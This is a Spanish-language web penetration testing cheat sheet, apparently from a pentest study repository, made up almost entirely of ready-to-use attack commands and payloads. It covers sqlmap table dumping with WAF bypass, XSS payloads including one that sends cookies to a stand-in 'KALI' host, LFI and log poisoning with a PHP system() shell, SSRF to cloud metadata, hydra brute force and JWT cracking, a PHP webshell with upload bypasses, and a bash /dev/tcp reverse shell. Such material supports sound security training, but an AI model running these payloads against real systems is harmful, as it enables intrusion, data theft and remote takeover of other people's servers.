# Web Pentest -- Cheat Sheet

---

## Reconocimiento

```bash
# Fingerprint
whatweb http://objetivo.com -v
curl -sI http://objetivo.com

# WAF
wafw00f http://objetivo.com

# Subdominios
sublist3r -d objetivo.com
ffuf -u http://FUZZ.objetivo.com -w subdomains.txt -fc 302,404

# Directorios
ffuf -u http://objetivo.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404
gobuster dir -u http://objetivo.com -w common.txt -x php,html,txt -b 404
nikto -h http://objetivo.com

# Script propio
python3 01-Reconocimiento/scripts/web_recon.py --url http://objetivo.com
```

---

## SQL Injection

```bash
# Deteccion manual
' OR 1=1-- 
' AND 1=2--

# sqlmap
sqlmap -u "http://objetivo.com/item?id=1" --batch --dbs
sqlmap -u "http://objetivo.com/item?id=1" -D db -T users --dump --batch
sqlmap -r request.txt --batch --level=5 --risk=3

# WAF bypass
sqlmap -u "URL" --tamper=space2comment,charencode --batch

# Script propio
python3 02-SQL-Injection/scripts/sqli_scanner.py --url http://objetivo.com/item?id=1
```

---

## XSS

```bash
# Payloads basicos
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# Robar cookie
<script>fetch('http://KALI:8000/?c='+document.cookie)</script>

# Recibir cookie
python3 -m http.server 8000

# Script propio
python3 03-XSS/scripts/xss_scanner.py --url http://objetivo.com/search --param q
```

---

## LFI / Path Traversal

```bash
# Payloads
?file=../../../../etc/passwd
?file=....//....//etc/passwd
?file=php://filter/convert.base64-encode/resource=index.php

# Log poisoning
curl -A "<?php system(\$_GET['cmd']); ?>" http://objetivo.com/
?file=../../../var/log/apache2/access.log&cmd=id

# Script propio
python3 04-LFI-RFI/scripts/lfi_scanner.py --url http://objetivo.com/page?file=
```

---

## SSRF

```bash
# Payloads
?url=http://127.0.0.1/admin
?url=http://169.254.169.254/latest/meta-data/
?url=http://192.168.1.1

# Bypass
?url=http://127.1
?url=http://0x7f000001
?url=http://localtest.me

# Script propio
python3 05-SSRF/scripts/ssrf_scanner.py --url http://objetivo.com/fetch --param url
```

---

## Autenticacion

```bash
# Brute force con hydra
hydra -l admin -P rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Brute force con ffuf
ffuf -u http://objetivo.com/login -X POST -d "user=admin&pass=FUZZ" -w rockyou.txt -fc 200

# JWT
jwt_tool TOKEN --crack -d rockyou.txt
hashcat -a 0 -m 16500 token.txt rockyou.txt
```

---

## File Upload

```bash
# Crear webshell
echo '<?php system($_GET["c"]); ?>' > shell.php

# Bypass extensiones
shell.php.jpg  shell.pHp  shell.php5  shell.phtml

# Recibir reverse shell
nc -lvnp 4444
# En la webshell:
?c=bash+-c+'bash+-i+>%26+/dev/tcp/KALI/4444+0>%261'
```

---

## API

```bash
# Documentacion
/swagger /api-docs /openapi.json /graphql

# IDOR
curl -H "Auth: Bearer TOKEN" http://api.com/users/1
curl -H "Auth: Bearer TOKEN" http://api.com/users/2  # datos de otro usuario?

# GraphQL introspection
curl -X POST http://objetivo.com/graphql -d '{"query":"{ __schema { types { name } } }"}'
```

---

## Herramientas rapidas

```bash
# Burp Suite
burpsuite &

# Nikto
nikto -h http://objetivo.com

# WhatWeb
whatweb http://objetivo.com

# SQLMap
sqlmap -u "URL?id=1" --batch

# ffuf
ffuf -u URL/FUZZ -w wordlist.txt

# Gobuster
gobuster dir -u URL -w wordlist.txt
```
